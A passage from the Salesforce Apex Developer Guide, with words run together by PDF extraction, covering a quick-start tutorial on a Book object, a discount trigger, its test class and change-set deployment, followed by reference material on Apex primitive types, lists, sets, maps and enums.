11.Click Next to accept the default values for field-level security.
17
Apex Quick StartApex Developer Guide

12.Click Save.
You've created a custom object called Book, and added a custom field to that custom object. Custom objects already have some standard
fields, like Name and CreatedBy, and allow you to add other fields that are more specific to your implementation. For this tutorial, the
Price field is part of our Book object, and the Apex class you’ll write in the next step accesses it.
SEE ALSO:
Salesforce Help: Find Object Management Settings
Add an Apex Class
In this step, you add an Apex class that contains a method for updating the book price. This method is called by the trigger that you’ll
be adding in the next step.
Prerequisites:
•
A Salesforce account in a sandbox Professional, Enterprise, Performance, or Unlimited Edition org, or an account in a Developer org.
•
The Book custom object.
1.From Setup, enter “Apex Classes” in the QuickFind box, then select Apex Classes and click New.
2.In the class editor, enter this class definition:
publicclassMyHelloWorld{
}
The previous code is the class definition to which you’ll be adding one method in the next step. Apex code is contained in classes.
This class is defined as public, which means the class is available to other Apex classes and triggers. For more information, see
Classes, Objects, and Interfaces on page 60.
3.Add this method definition between the class opening and closing brackets.
publicstaticvoidapplyDiscount(Book__c[]books){
for (Book__cb :books){
b.Price__c*= 0.9;
}
}
This method is called applyDiscount, and it’s both public and static. Because it’s a static method, you don't need to create an
instance of the class to access the method—you can use the name of the class followed by a dot (.) and the name of the method.
For more information, see Static and Instance Methods, Variables, and Initialization Code on page 69.
This method takes one parameter, a list of Book records, which is assigned to the variable books. Notice the __c in the object
name Book__c. This indicates that it’s a custom object that you created. Standard objects that are provided in the Salesforce
application, such as Account, don't end with this postfix.
The next section of code contains the rest of the method definition:
for (Book__cb :books){
b.Price__c*= 0.9;
}
Notice the __c after the field name Price__c. This indicates that it’s a custom field that you created. Standard fields that are
provided by default in Salesforce are accessed using the same type of dot notation but without the __c, for example, Name doesn't
end with __c in Book__c.Name. The statement b.Price__c*= 0.9; takes the old value of b.Price__c, multiplies
it by 0.9, which means its value is discounted by 10%, and then stores the new value into the b.Price__c field. The *= operator
18
Apex Quick StartApex Developer Guide

is a shortcut. Another way to write this statement is b.Price__c= b.Price__c* 0.9;. See Expression Operators on
page 39.
4.Click Save to save the new class. You now have this full class definition.
publicclassMyHelloWorld{
publicstaticvoidapplyDiscount(Book__c[]books){
for (Book__cb :books){
b.Price__c*= 0.9;
}
}
}
You now have a class that contains some code that iterates over a list of books and updates the Price field for each book. This code is
part of the applyDiscount static method called by the trigger that you’ll create in the next step.
Add an Apex Trigger
In this step, you create a trigger for the Book__c custom object that calls the applyDiscount method of the MyHelloWorld
class that you created in the previous step.
Prerequisites:
•
A Salesforce account in a sandbox Professional, Enterprise, Performance, or Unlimited Edition org, or an account in a Developer org.
•
The MyHelloWorld Apex class.
A trigger is a piece of code that executes before or after records of a particular type are inserted, updated, or deleted from the Lightning
Platform database. Every trigger runs with a set of context variables that provide access to the records that caused the trigger to fire. All
triggers run in bulk; that is, they process several records at once.
1.From the object management settings for books, go to Triggers, and then click New.
2.In the trigger editor, delete the default template code and enter this trigger definition:
triggerHelloWorldTriggeron Book__c(beforeinsert) {
Book__c[]books= Trigger.new;
MyHelloWorld.applyDiscount(books);
}
The first line of code defines the trigger:
triggerHelloWorldTriggeron Book__c(beforeinsert) {
It gives the trigger a name, specifies the object on which it operates, and defines the events that cause it to fire. For example, this
trigger is called HelloWorldTrigger, it operates on the Book__c object, and runs before new books are inserted into the database.
The next line in the trigger creates a list of book records named books and assigns it the contents of a trigger context variable
called Trigger.new. Trigger context variables such as Trigger.new are implicitly defined in all triggers and provide access
to the records that caused the trigger to fire. In this case, Trigger.new contains all the new books that are about to be inserted.
Book__c[]books= Trigger.new;
The next line in the code calls the method applyDiscount in the MyHelloWorld class. It passes in the array of new books.
MyHelloWorld.applyDiscount(books);
19
Apex Quick StartApex Developer Guide

You now have all the code that is needed to update the price of all books that get inserted. However, there’s still one piece of the puzzle
missing. Unit tests are an important part of writing code and are required. In the next step, you'll see why this is so and will be able to
add a test class.
SEE ALSO:
Salesforce Help: Find Object Management Settings
Add a Test Class
In this step, you add a test class with one test method. You also run the test and verify code coverage. The test method exercises and
validates the code in the trigger and class. Also, it enables you to reach 100% code coverage for the trigger and class.
Prerequisites:
•
A Salesforce account in a sandbox Professional, Enterprise, Performance, or Unlimited Edition org, or an account in a Developer org.
•
The HelloWorldTrigger Apex trigger.
Note:  Testing is an important part of the development process. Before you can deploy Apex or package it for AppExchange, the
following must be true.
•
Unit tests must cover at least 75% of your Apex code, and all of those tests must complete successfully.
Note the following.
–
When deploying Apex to a production organization, each unit test in your organization namespace is executed by default.
–
Calls to System.debug aren’t counted as part of Apex code coverage.
–
Test methods and test classes aren’t counted as part of Apex code coverage.
–
While only 75% of your Apex code must be covered by tests, don’t focus on the percentage of code that is covered. Instead,
make sure that every use case of your application is covered, including positive and negative cases, as well as bulk and
single records. This approach ensures that 75% or more of your code is covered by unit tests.
•
Every trigger must have some test coverage.
•
All classes and triggers must compile successfully.
1.From Setup, enter ApexClasses in the QuickFind box, then select Apex Classes and click New.
2.In the class editor, add this test class definition, and then click Save.
@IsTest
privateclassHelloWorldTestClass{
@IsTest
staticvoidvalidateHelloWorld(){
Book__cb = new Book__c(Name='Behindthe Cloud', Price__c=100);
System.debug('Pricebeforeinsertingnew book:' + b.Price__c);
// Insertbook
insertb;
// Retrievethe new book
b = [SELECTPrice__cFROMBook__cWHEREId =:b.Id];
System.debug('Priceaftertriggerfired:' + b.Price__c);
// Testthatthe triggercorrectlyupdatedthe price
System.assertEquals(90,b.Price__c);
20
Apex Quick StartApex Developer Guide

}
}
This class is defined using the @IsTest annotation. Classes defined this way should only contain test methods and any methods
required to support those test methods. One advantage to creating a separate class for testing is that classes defined with @IsTest
don’t count against your org’s limit of 6 MB of Apex code. You can also add the @IsTest annotation to individual methods. For
more information, see @IsTest Annotation on page 105 and Execution Governors and Limits.
The method validateHelloWorld is defined using the @IsTest annotation. This annotation means that if changes are
made to the database, they’re rolled back when execution completes. You don’t have to delete any test data created in the test
method.
Note:  The @IsTest annotation on methods is equivalent to the testMethod keyword. As best practice, Salesforce
recommends that you use @IsTest rather than testMethod. The testMethod keyword may be versioned out in a
future release.
First, the test method creates a book and inserts it into the database temporarily. The System.debug statement writes the value
of the price in the debug log.
Book__cb = new Book__c(Name='Behindthe Cloud', Price__c=100);
System.debug('Pricebeforeinsertingnew book:' + b.Price__c);
// Insertbook
insertb;
After the book is inserted, the code retrieves the newly inserted book, using the ID that was initially assigned to the book when it
was inserted. The System.debug statement then logs the new price that the trigger modified.
// Retrievethe new book
b = [SELECTPrice__cFROMBook__cWHEREId =:b.Id];
System.debug('Priceaftertriggerfired:' + b.Price__c);
When the MyHelloWorld class runs, it updates the Price__c field and reduces its value by 10%. The following test verifies
that the method applyDiscount ran and produced the expected result.
// Testthatthe triggercorrectlyupdatedthe price
System.assertEquals(90,b.Price__c);
3.To run this test and view code coverage information, switch to the Developer Console.
4.In the Developer Console, click Test > New Run.
5.To select your test class, click HelloWorldTestClass.
6.To add all methods in the HelloWorldTestClass class to the test run, click Add Selected.
7.Click Run.
The test result displays in the Tests tab. Optionally, you can expand the test class in the Tests tab to view which methods were run.
In this case, the class contains only one test method.
8.The Overall Code Coverage pane shows the code coverage of this test class. To view the percentage of lines of code in the trigger
covered by this test, which is 100%, double-click the code coverage line for HelloWorldTrigger. Because the trigger calls a method
from the MyHelloWorld class, this class also has coverage (100%). To view the class coverage, double-click MyHelloWorld.
9.To open the log file, in the Logs tab, double-click the most recent log line in the list of logs. The execution log displays, including
logging information about the trigger event, the call to the applyDiscount method, and the price before and after the trigger.
21
Apex Quick StartApex Developer Guide

By now, you’ve completed all the steps necessary for writing some Apex code with a test that runs in your development environment.
In the real world, after you tested your code and are satisfied with it, you want to deploy the code and any prerequisite components to
a production org. The next step shows you how to do this deployment for the code and custom object you created.
SEE ALSO:
Salesforce Help: Open the Developer Console
Deploy Components to Production
In this step, you deploy the Apex code and the custom object you created previously to your production organization using change
sets.
Prerequisites:
•
A Salesforce account in a sandbox Performance, Unlimited, or Enterprise Edition organization.
•
The HelloWorldTestClass Apex test class.
•
A deployment connection between the sandbox and production organizations that allows inbound change sets to be received by
the production organization. See “Change Sets” in Salesforce Help.
•
“Create and Upload Change Sets” user permission to create, edit, or upload outbound change sets.
This procedure doesn't apply to Developer organizations since change sets are available only in Performance, Unlimited, Enterprise, or
Database.com Edition organizations. If you have a Developer Edition account, you can use other deployment methods. For more
information, see Deploying Apex.
1.From Setup, enter OutboundChangesets in the QuickFind box, then select Outbound Changesets.
2.If a splash page appears, click Continue.
3.In the Change Sets list, click New.
4.Enter a name for your change set, for example, HelloWorldChangeSet, and optionally a description. Click Save.
5.In the Change Set Components section, click Add.
6.Select Apex Class from the component type dropdown list, then select the MyHelloWorld and the HelloWorldTestClass classes from
the list and click Add to Change Set.
7.To add the dependent components, click View/Add Dependencies.
8.To select all components, select the top checkbox. Click Add To Change Set.
9.In the Change Set Detail section of the change set page, click Upload.
10.Select the target organization, in this case production, and click Upload.
11.After the change set upload completes, deploy it in your production organization.
a.Log in to your production organization.
b.From Setup, enter InboundChangeSets in the QuickFind box, then select Inbound Change Sets.
c.If a splash page appears, click Continue.
d.In the change sets awaiting deployment list, click your change set's name.
e.Click Deploy.
In this tutorial, you learned how to create a custom object, how to add an Apex trigger, class, and test class. Finally, you also learned
how to test your code, and how to upload the code and the custom object using Change Sets.
22
Apex Quick StartApex Developer Guide

Writing Apex
Apex is like Java for Salesforce. It enables you to add and interact with data in the Lightning Platform persistence layer. It uses classes,
data types, variables, and if-else statements. You can make it execute based on a condition, or have a block of code execute repeatedly.
Data Types and Variables
Apex uses data types, variables, and related language constructs such as enums, constants, expressions, operators, and assignment
statements.
Control Flow Statements
Apex provides if-else statements, switch statements, and loops to control the flow of code execution. Statements are generally
executed line by line, in the order they appear. With control flow statements, you can make Apex code execute based on a certain
condition, or have a block of code execute repeatedly.
Working with Data in Apex
You can add and interact with data in the Lightning Platform persistence layer. The sObject data type is the main data type that
holds data objects. You’ll use Data Manipulation Language (DML) to work with data, and use query languages to retrieve data, such
as the (), among other things.
Document Your Apex Code
ApexDoc is a standardized comment format that makes it easier for humans, documentation generators, and AI agents to understand
your codebase. We recommend using ApexDoc comments to facilitate code collaboration and increase long-term code maintainability.
Based on the JavaDoc standard, ApexDoc provides specifications, such as specialized tags and guidelines, that are tailored to Apex
and the Salesforce ecosystem.
Data Types and Variables
Apex uses data types, variables, and related language constructs such as enums, constants, expressions, operators, and assignment
statements.
1.Data Types
In Apex, all variables and expressions have a data type, such as sObject, primitive, or enum.
2.Primitive Data Types
Apex uses the same primitive data types as SOAP API, except for higher-precision Decimal type in certain cases.
3.Collections
Collections in Apex can be lists, sets, or maps.
4.Enums
An enum is an abstract data type with values that each take on exactly one of a finite set of identifiers that you specify. Enums are
typically used to define a set of possible values that don’t otherwise have a numerical order. Typical examples include the suit of a
card, or a particular season of the year.
5.Variables
Local variables are declared with Java-style syntax.
6.Constants
Apex constants are variables whose values don’t change after being initialized once. Constants can be defined using the final
keyword.
23
Writing ApexApex Developer Guide

7.Expressions and Operators
An expression is a construct made up of variables, operators, and method invocations that evaluates to a single value.
8.Assignment Statements
An assignment statement is any statement that places a value into a variable.
9.Rules of Conversion
In general, Apex requires you to explicitly convert one data type to another. For example, a variable of the Integer data type cannot
be implicitly converted to a String. You must use the string.format method. However, a few data types can be implicitly
converted, without using a method.
Data Types
In Apex, all variables and expressions have a data type, such as sObject, primitive, or enum.
•
A primitive, such as an Integer, Double, Long, Date, Datetime, String, ID, or Boolean (see Primitive Data Types on page 24)
•
An sObject, either as a generic sObject or as a specific sObject, such as an Account, Contact, or MyCustomObject__c (see Working
with sObjects on page 130 in Chapter 4.)
•
A collection, including:
–
A list (or array) of primitives, sObjects, user defined objects, objects created from Apex classes, or collections (see Lists on page
28)
–
A set of primitives (see Sets on page 31)
–
A map from a primitive to a primitive, sObject, or collection (see Maps on page 31)
•
A typed list of values, also known as an enum (see Enums on page 33)
•
Objects created from user-defined Apex classes (see Classes, Objects, and Interfaces on page 60)
•
Objects created from system supplied Apex classes
•
Null (for the null constant, which can be assigned to any variable)
Methods can return values of any of the listed types, or return no value and be of type Void.
Type checking is strictly enforced at compile time. For example, the parser generates an error if an object field of type Integer is assigned
a value of type String. However, all compile-time exceptions are returned as specific fault codes, with the line number and column of
the error. For more information, see Debugging Apex on page 665.
Primitive Data Types
Apex uses the same primitive data types as SOAP API, except for higher-precision Decimal type in certain cases.
All Apex variables, whether they’re class member variables or method variables, are initialized to null. Make sure that you initialize
your variables to appropriate values before using them. For example, initialize a Boolean variable to false.
Apex primitive data types include:
DescriptionData Type
A collection of binary data stored as a single object. You can convert this data type to String or from
String using the toString and valueOf methods, respectively. Blobs can be accepted as Web
Blob
service arguments, stored in a document (the body of a document is a Blob), or sent as attachments.
For more information, see Crypto Class. Salesforce supports Blob manipulation only with Apex class
methods that are supplied by Salesforce.
24
Data Types and VariablesApex Developer Guide

DescriptionData Type
A value that can only be assigned true, false, or null. For example:
BooleanisWinner= true;
Boolean
A value that indicates a particular day. Unlike Datetime values, Date values contain no information
about time. Always create date values with a system static method.
You can add or subtract an Integer value from a Date value, returning a Date value. Addition and
subtraction of Integer values are the only arithmetic functions that work with Date values. You can’t
perform arithmetic functions that include two or more Date values. Instead, use the Date methods.
Date
Use the String.valueOf() method to obtain the date without an appended timestamp.
Using an implicit string conversion with a Date value results in the date with the timestamp appended.
A value that indicates a particular day and time, such as a timestamp. Always create datetime values
with a system static method.
You can add or subtract an Integer or Double value from a Datetime value, returning a Date value.
Addition and subtraction of Integer and Double values are the only arithmetic functions that work
Datetime
with Datetime values. You can’t perform arithmetic functions that include two or more Datetime
values. Instead, use the Datetime methods.
A number that includes a decimal point. Decimal is an arbitrary precision number. Currency fields
are automatically assigned the type Decimal.
If you don’t explicitly set the number of decimal places for a Decimal, the item from which the Decimal
is created determines the Decimal’s scale. Scale is a count of decimal places. Use the setScale
method to set a Decimal’s scale.
Decimal
•
If the Decimal is created as part of a query, the scale is based on the scale of the field returned
from the query.
•
If the Decimal is created from a String, the scale is the number of characters after the decimal
point of the String.
•
If the Decimal is created from a non-decimal number, the number is first converted to a String.
The scale is then set using the number of characters after the decimal point.
Note:  Two Decimal objects that are numerically equivalent but differ in scale (such as 1.1
and 1.10) generally don’t have the same hashcode. Use caution when such Decimal objects
are used in Sets or as Map keys.
A 64-bit number that includes a decimal point. Doubles have a minimum value of -2
63
 and a maximum
value of 2
63
-1. For example:
Doublepi = 3.14159;
Doublee = 2.7182818284D;
Double
Scientific notation (e) for Doubles isn’t supported.
Any valid 18-character Lightning Platform record identifier. For example:
ID id='00300000003T2PGAA0';
ID
25
Data Types and VariablesApex Developer Guide

DescriptionData Type
If you set ID to a 15-character value, Apex converts the value to its 18-character representation. All
invalid ID values are rejected with a runtime exception.
A 32-bit number that doesn’t include a decimal point. Integers have a minimum value of
-2,147,483,648 and a maximum value of 2,147,483,647. For example:
Integeri = 1;
Integer
A 64-bit number that doesn’t include a decimal point. Longs have a minimum value of -2
63
 and a
maximum value of 2
63
-1. Use this data type when you need a range of values wider than the range
provided by Integer. For example:
Longl = 2147483648L;
Long
Any data type that is supported in Apex. Apex supports primitive data types (such as Integer),
user-defined custom classes, the sObject generic type, or an sObject specific type (such as Account).
All Apex data types inherit from Object.
Object
You can cast an object that represents a more specific data type to its underlying data type. For
example:
Objectobj = 10;
// Castthe objectto an integer.
Integeri = (Integer)obj;
System.assertEquals(10,i);
The next example shows how to cast an object to a user-defined type—a custom Apex class named
MyApexClass that is predefined in your organization.
Objectobj = new MyApexClass();
// Castthe objectto the MyApexClasscustomtype.
MyApexClassmc = (MyApexClass)obj;
// Accessa methodon the user-definedclass.
mc.someClassMethod();
Any set of characters surrounded by single quotes. For example,
Strings = 'Thequickbrownfox jumpedoverthe lazydog.';
String
String size: The limit on the number of characters is governed by the heap size limit.
Empty Strings and Trailing Whitespace: sObject String field values follow the same rules as in
SOAP API: they can never be empty (only null), and they can never include leading and trailing
whitespace. These conventions are necessary for database storage.
Conversely, Strings in Apex can be null or empty and can include leading and trailing whitespace,
which can be used to construct a message.
The Solution sObject field SolutionNote operates as a special type of String. If you have HTML Solutions
enabled, any HTML tags used in this field are verified before the object is created or updated. If invalid
HTML is entered, an error is thrown. Any JavaScript used in this field is removed before the object is
26
Data Types and VariablesApex Developer Guide

DescriptionData Type
created or updated. In the following example, when the Solution displays on a detail page, the
SolutionNote field has H1 HTML formatting applied to it:
triggert on Solution(beforeinsert) {
Trigger.new[0].SolutionNote='<h1>hello</h1>';
}
In the following example, when the Solution displays on a detail page, the SolutionNote field only
contains HelloGoodbye:
triggert2 on Solution(beforeinsert) {
Trigger.new[0].SolutionNote=
'<javascript>Hello</javascript>Goodbye';
}
For more information, see “HTML Solutions Overview” in Salesforce Help.
EscapeSequences: All Strings in Apex use the same escape sequences as SOQL strings: \b
(backspace), \t(tab), \n (line feed), \f (form feed), \r (carriage return), \" (double quote),
\' (single quote), and \\ (backslash).
Comparison Operators: Unlike Java, Apex Strings support using the comparison operators ==,
!=, <, <=, >, and >=. Because Apex uses SOQL comparison semantics, results for Strings are collated
according to the context user’s locale and aren’t case-sensitive. For more information, see Expression
Operators.
String Methods: As in Java, Strings can be manipulated with several standard methods. For more
information, see String Class.
Apex classes and triggers saved (compiled) using API version 15.0 and higher produce a runtime
error if you assign a String value that is too long for the field.
A value that indicates a particular time. Always create time values with a system static method. See
Time Class.
Time
In addition, two non-standard primitive data types can’t be used as variable or method types, but do appear in system static methods:
•
AnyType. The valueOf static method converts an sObject field of type AnyType to a standard primitive. AnyType is used within
the Lightning Platform database exclusively for sObject fields in field history tracking tables.
•
Currency. The Currency.newInstance static method creates a literal of type Currency. This method is for use solely within
SOQL and SOSL WHERE clauses to filter against sObject currency fields. You can’t instantiate Currency in any other type of Apex.
For more information on the AnyType data type, see Field Types in the Object Reference for Salesforce.
27
Data Types and VariablesApex Developer Guide

Versioned Behavior Changes
In API version 16 (Summer ’09) and later, Apex uses the higher-precision Decimal data type in certain types such as currency.
SEE ALSO:
Expression Operators
Class Methods
Object Reference for the Salesforce Platform: Primitive Data Types
Collections
Collections in Apex can be lists, sets, or maps.
Note: There is no limit on the number of items a collection can hold. However, there is a general limit on heap size.
Lists
A list is an ordered collection of elements that are distinguished by their indices. List elements can be of any data type—primitive
types, collections, sObjects, user-defined types, and built-in Apex types.
Sets
A set is an unordered collection of elements that do not contain any duplicates. Set elements can be of any data type—primitive
types, collections, sObjects, user-defined types, and built-in Apex types.
Maps
A map is a collection of key-value pairs where each unique key maps to a single value. Keys and values can be any data type—primitive
types, collections, sObjects, user-defined types, and built-in Apex types.
Parameterized Typing
Apex, in general, is a statically-typed programming language, which means users must specify the data type for a variable before
that variable can be used.
SEE ALSO:
Execution Governors and Limits
Lists
A list is an ordered collection of elements that are distinguished by their indices. List elements can be of any data type—primitive types,
collections, sObjects, user-defined types, and built-in Apex types.
This table is a visual representation of a list of Strings:
Index 5Index 4Index 3Index 2Index 1Index 0
'Purple''Blue''Green''Yellow''Orange''Red'
The index position of the first element in a list is always 0.
Lists can contain any collection and can be nested within one another and become multidimensional. For example, you can have a list
of lists of sets of Integers. A list can contain up to seven levels of nested collections inside it, that is, up to eight levels overall.
28
Data Types and VariablesApex Developer Guide

To declare a list, use the List keyword followed by the primitive data, sObject, nested list, map, or set type within <> characters. For
example:
// Createan emptylistof String
List<String> my_list= new List<String>();
// Createa nestedlist
List<List<Set<Integer>>> my_list_2= new List<List<Set<Integer>>>();
To access elements in a list, use the List methods provided by Apex. For example:
List<Integer> myList= new List<Integer>();// Definea new list
myList.add(47);// Addsa secondelementof value47 to the end
// of the list
Integeri = myList.get(0);// Retrievesthe elementat index0
myList.set(0,1);// Addsthe integer1 to the listat index0
myList.clear();// Removesall elementsfromthe list
For more information, including a complete list of all supported methods, see List Class.
Using Array Notation for One-Dimensional Lists
When using one-dimensional lists of primitives or objects, you can also use more traditional array notation to declare and reference list
elements. For example, you can declare a one-dimensional list of primitives or objects by following the data type name with the []
characters:
String[] colors= new List<String>();
These two statements are equivalent to the previous:
List<String> colors= new String[1];
String[] colors= new String[1];
To reference an element of a one-dimensional list, you can also follow the name of the list with the element's index position in square
brackets. For example:
colors[0]= 'Green';
Even though the size of the previous String array is defined as one element (the number between the brackets in new String[1]),
lists are elastic and can grow as needed provided that you use the Listadd method to add new elements. For example, you can
add two or more elements to the colors list. But if you’re using square brackets to add an element to a list, the list behaves like an
array and isn’t elastic, that is, you won’t be allowed to add more elements than the declared array size.
All lists are initialized to null. Lists can be assigned values and allocated memory using literal notation. For example:
DescriptionExample
Defines an Integer list of size zero with no elements
List<Integer> ints= new Integer[0];
Defines an Integer list with memory allocated for six Integers
List<Integer> ints= new Integer[6];
List Sorting
You can sort list elements and the sort order depends on the data type of the elements.
29
Data Types and VariablesApex Developer Guide

List Sorting
You can sort list elements and the sort order depends on the data type of the elements.
Using the List.sort method, you can sort elements in a list. Sorting is in ascending order for elements of primitive data types, such
as strings. The sort order of other more complex data types is described in the chapters covering those data types.
You can sort custom types (your Apex classes) if they implement the Comparable interface. Alternatively, a class implementing the
Comparator interface can be passed as a parameter to the List.sort method. For more information on the sort order used for
sObjects, see Sorting Lists of sObjects.
This example shows how to sort a list of strings and verifies that the colors are in ascending order in the list.
List<String> colors= new List<String>{
'Yellow',
'Red',
'Green'};
colors.sort();
System.assertEquals('Green', colors.get(0));
System.assertEquals('Red', colors.get(1));
System.assertEquals('Yellow', colors.get(2));
For the Visualforce SelectOption control, sorting is in ascending order based on the value and label fields. See this next section for the
sequence of comparison steps used for SelectOption.
Default Sort Order for SelectOption
The List.sort method sorts SelectOption elements in ascending order using the value and label fields, and is based on this
comparison sequence.
1.The value field is used for sorting first.
2.If two value fields have the same value or are both empty, the label field is used.
The disabled field isn’t used for sorting.
For text fields, the sort algorithm uses the Unicode sort order. Also, empty fields precede non-empty fields in the sort order.
In this example, a list contains three SelectOption elements. Two elements, United States and Mexico, have the same value field (‘A’).
The List.sort method sorts these two elements based on the label field, and places Mexico before United States, as shown in the
output. The last element in the sorted list is Canada and is sorted on its value field ‘C’, which comes after ‘A’.
List<SelectOption>options= new List<SelectOption>();
options.add(new SelectOption('A','UnitedStates'));
options.add(new SelectOption('C','Canada'));
options.add(new SelectOption('A','Mexico'));
System.debug('Beforesorting:' + options);
options.sort();
System.debug('Aftersorting:' + options);
The output of the debug statements shows the contents of the list, both before and after the sort.
DEBUG|Beforesorting:(System.SelectOption[value="A",label="UnitedStates",
disabled="false"],
System.SelectOption[value="C",label="Canada",disabled="false"],
System.SelectOption[value="A",label="Mexico",disabled="false"])
DEBUG|Aftersorting:(System.SelectOption[value="A",label="Mexico",disabled="false"],
System.SelectOption[value="A",label="UnitedStates",disabled="false"],
System.SelectOption[value="C",label="Canada",disabled="false"])
30
Data Types and VariablesApex Developer Guide

Sets
A set is an unordered collection of elements that do not contain any duplicates. Set elements can be of any data type—primitive types,
collections, sObjects, user-defined types, and built-in Apex types.
This table represents a set of strings that uses city names:
'Tokyo''Paris''New York''San Francisco'
Sets can contain collections that can be nested within one another. For example, you can have a set of lists of sets of Integers. A set can
contain up to seven levels of nested collections inside it, that is, up to eight levels overall.
To declare a set, use the Set keyword followed by the primitive data type name within <> characters. For example:
Set<String> myStringSet= new Set<String>();
The following example shows how to create a set with two hardcoded string values.
// Definesa new set withtwo elements
Set<String> set1= new Set<String>{'NewYork', 'Paris'};
To access elements in a set, use the system methods provided by Apex. For example:
// Definea new set
Set<Integer> mySet= new Set<Integer>();
// Add two elementsto the set
mySet.add(1);
mySet.add(3);
// Assertthatthe set containsthe integervaluewe added
System.assert(mySet.contains(1));
// Removethe integervaluefromthe set
mySet.remove(1);
The following example shows how to create a set from elements of another set.
// Definea new set thatcontainsthe
// elementsof the set createdin the previousexample
Set<Integer> mySet2= new Set<Integer>(mySet);
// Assertthatthe set sizeequals1
// Note:The set fromthe previousexamplecontainsonlyone value
System.assert(mySet2.size()== 1);
For more information, including a complete list of all supported set system methods, see Set Class.
Note the following limitations on sets:
•
Unlike Java, Apex developers do not need to reference the algorithm that is used to implement a set in their declarations (for example,
HashSet or TreeSet). Apex uses a hash structure for all sets.
•
A set is an unordered collection—you can’t access a set element at a specific index. You can only iterate over set elements.
•
The iteration order of set elements is deterministic, so you can rely on the order being the same in each subsequent execution of
the same code.
Maps
A map is a collection of key-value pairs where each unique key maps to a single value. Keys and values can be any data type—primitive
types, collections, sObjects, user-defined types, and built-in Apex types.
31
Data Types and VariablesApex Developer Guide

This table represents a map of countries and currencies:
'India''England''France''Japan''United States'Country (Key)
'Rupee''Pound''Euro''Yen''Dollar'Currency (Value)
Map keys and values can contain any collection, and can contain nested collections. For example, you can have a map of Integers to
maps, which, in turn, map Strings to lists. Map keys can contain up to seven levels of nested collections, that is, up to eight levels overall.
To declare a map, use the Map keyword followed by the data types of the key and the value within <> characters. For example:
Map<String, String> country_currencies= new Map<String, String>();
Map<ID, Set<String>> m = new Map<ID, Set<String>>();
You can use the generic or specific sObject data types with maps. You can also create a generic instance of a map.
As with lists, you can populate map key-value pairs when the map is declared by using curly brace ({}) syntax. Within the curly braces,
specify the key first, then specify the value for that key using =>. For example:
Map<String, String> MyStrings= new Map<String, String>{'a' => 'b', 'c' =>
'd'.toUpperCase()};
In the first example, the value for the key a is b, and the value for the key c is D.
To access elements in a map, use the Map methods provided by Apex. This example creates a map of integer keys and string values. It
adds two entries, checks for the existence of the first key, retrieves the value for the second entry, and finally gets the set of all keys.
Map<Integer, String> m = new Map<Integer, String>();// Definea new map
m.put(1,'Firstentry');// Inserta new key-valuepairin the map
m.put(2,'Secondentry');// Inserta new key-valuepairin the map
System.assert(m.containsKey(1));// Assertthatthe map containsa key
Stringvalue= m.get(2);// Retrievea value,givena particularkey
System.assertEquals('Secondentry', value);
Set<Integer> s = m.keySet();// Returna set thatcontainsall of the keysin the
map
For more information, including a complete list of all supported Map methods, see Map Class.
Map Considerations
•
Unlike Java, Apex developers don’t need to reference the algorithm that is used to implement a map in their declarations (for example,
HashMap or TreeMap). Apex uses a hash structure for all maps.
•
The iteration order of map elements is deterministic. You can rely on the order being the same in each subsequent execution of the
same code. However, we recommend to always access map elements by key.
•
A map key can hold the null value.
•
Adding a map entry with a key that matches an existing key in the map overwrites the existing entry with that key with the new
entry.
•
Map keys of type String are case-sensitive. Two keys that differ only by the case are considered unique and have corresponding
distinct Map entries. Subsequently, the Map methods, including put, get, containsKey, and remove treat these keys as
distinct.
•
Uniqueness of map keys of user-defined types is determined by the equals and hashCode methods, which you provide in
your classes. Uniqueness of keys of all other non-primitive types, such as sObject keys, is determined by comparing the objects’ field
values. Use caution when you use an sObject as a map key because when the sObject is changed, it no longer maps to the same
32
Data Types and VariablesApex Developer Guide

value. For information and examples, see
https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_map_sobject_considerations.htm
•
A Map object is serializable into JSON only if it uses one of the following data types as a key.
–
Boolean
–
Date
–
DateTime
–
Decimal
–
Double
–
Enum
–
Id
–
Integer
–
Long
–
String
–
Time
Parameterized Typing
Apex, in general, is a statically-typed programming language, which means users must specify the data type for a variable before that
variable can be used.
This is legal in Apex:
Integerx = 1;
This is not legal, if x has not been defined earlier:
x = 1;
Lists, maps and sets are parameterized in Apex: they take any data type Apex supports for them as an argument. That data type must be
replaced with an actual data type upon construction of the list, map or set. For example:
List<String> myList= new List<String>();
Subtyping with Parameterized Lists
In Apex, if type T is a subtype of U, then List<T> would be a subtype of List<U>. For example, the following is legal:
List<String> slst= new List<String> {'alpha', 'beta'};
List<Object> olst= slst;
Enums
An enum is an abstract data type with values that each take on exactly one of a finite set of identifiers that you specify. Enums are typically
used to define a set of possible values that don’t otherwise have a numerical order. Typical examples include the suit of a card, or a
particular season of the year.
Although each value corresponds to a distinct integer value, the enum hides this implementation. Hiding the implementation prevents
any possible misuse of the values to perform arithmetic and so on. After you create an enum, variables, method arguments, and return
types can be declared of that type.
33
Data Types and VariablesApex Developer Guide

Note:  Unlike Java, the enum type itself has no constructor syntax.
To define an enum, use the enum keyword in your declaration and use curly braces to demarcate the list of possible values. For example,
the following code creates an enum called Season:
publicenumSeason{WINTER,SPRING,SUMMER,FALL}
By creating the enum Season, you have also created a new data type called Season. You can use this new data type as you would
any other data type. For example:
SeasonsouthernHemisphereSeason= Season.WINTER;
publicSeasongetSouthernHemisphereSeason(SeasonnorthernHemisphereSeason){
if (northernHemisphereSeason== Season.SUMMER)returnsouthernHemisphereSeason;
//...
}
You can also define a class as an enum. When you create an enum class, do not use the class keyword in the definition.
publicenumMyEnumClass{ X, Y }
You can use an enum in any place you can use another data type name. If you define a variable whose type is an enum, any object you
assign to it must be an instance of that enum class.
Any webservice method can use enum types as part of their signature. In this case, the associated WSDL file includes definitions
for the enum and its values, which the API client can use.
Apex provides the following system-defined enums:
•
System.StatusCode
This enum corresponds to the API error code that is exposed in the WSDL document for all API operations. For example:
StatusCode.CANNOT_INSERT_UPDATE_ACTIVATE_ENTITY
StatusCode.INSUFFICIENT_ACCESS_ON_CROSS_REFERENCE_ENTITY
The full list of status codes is available in the WSDL file for your organization. For more information about accessing the WSDL file
for your organization, see Downloading Salesforce WSDLs and Client Authentication Certificates in Salesforce Help.
•
System.XmlTag:
This enum returns a list of XML tags used for parsing the result XML from a webservice method. For more information, see
XmlStreamReader Class.
•
System.ApplicationReadWriteMode: This enum indicates if an organization is in 5 Minute Upgrade read-only mode
during Salesforce upgrades and downtimes. For more information, see System.getApplicationReadWriteMode().
•
System.LoggingLevel:
This enum is used with the system.debug method, to specify the log level for all debug calls. For more information, see System
Class.
•
System.RoundingMode:
This enum is used by methods that perform mathematical operations to specify the rounding behavior for the operation. Typical
